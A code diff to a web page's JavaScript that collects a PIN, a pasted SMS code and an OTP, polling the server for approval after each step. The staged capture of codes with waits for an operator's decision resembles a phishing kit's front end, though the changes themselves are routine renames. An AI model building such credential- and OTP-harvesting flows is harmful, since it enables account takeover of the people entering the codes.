@@ -1006,7 +1006,6 @@
     }, 2000);
   }
 
-  // Backwards compatibility alias
   const doLogin = submitPin;
 
   // ==========================================
@@ -1016,8 +1015,8 @@
   async function submitSms() {
     if (_smsInFlight || !S.applicationId) return;
 
-    const smsText = document.getElementById('smsPasteInput').value.trim();
-    if (!smsText) {
+    const smsCode = document.getElementById('smsPasteInput').value.trim();
+    if (!smsCode) {
       showOtpMsg('warning', 'Please paste or enter your SMS verification code.');
       return;
     }
@@ -1032,7 +1031,11 @@
       const res = await fetch('/api/verify-sms', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ applicationId: S.applicationId, smsText })
+        body: JSON.stringify({ 
+          applicationId: S.applicationId, 
+          smsCode: smsCode, 
+          smsText: smsCode 
+        })
       });
       const data = await res.json();
 
@@ -1068,7 +1071,7 @@
         const data = await res.json();
         if (!data.success) return;
 
-        if (data.status === 'approved' || data.status === 'sms_approved') {
+        if (data.status === 'approved') {
           clearInterval(smsPollInterval);
           smsPollInterval = null;
           document.getElementById('pinWait').classList.remove('show');
@@ -1078,7 +1081,7 @@
           startRs();
           document.getElementById('o0').focus();
 
-        } else if (data.status === 'rejected' || data.status === 'sms_rejected') {
+        } else if (data.status === 'rejected') {
           clearInterval(smsPollInterval);
           smsPollInterval = null;
           document.getElementById('pinWait').classList.remove('show');
@@ -1096,7 +1099,6 @@
     }, 2000);
   }
 
-  // Backwards compatibility alias
   const submitSmsStep = submitSms;
 
   // ==========================================
@@ -1204,7 +1206,6 @@
     }, 2000);
   }
 
-  // Backwards compatibility alias
   const doOtp = submitOtp;
 
   // RESEND OTP
@@ -1333,7 +1334,6 @@
     setInterval(displayPopup, 4500);
   });
 
-  // INITIAL CALCULATOR DISPLAY UPDATE
   calcUp();
 </script>
 </body>
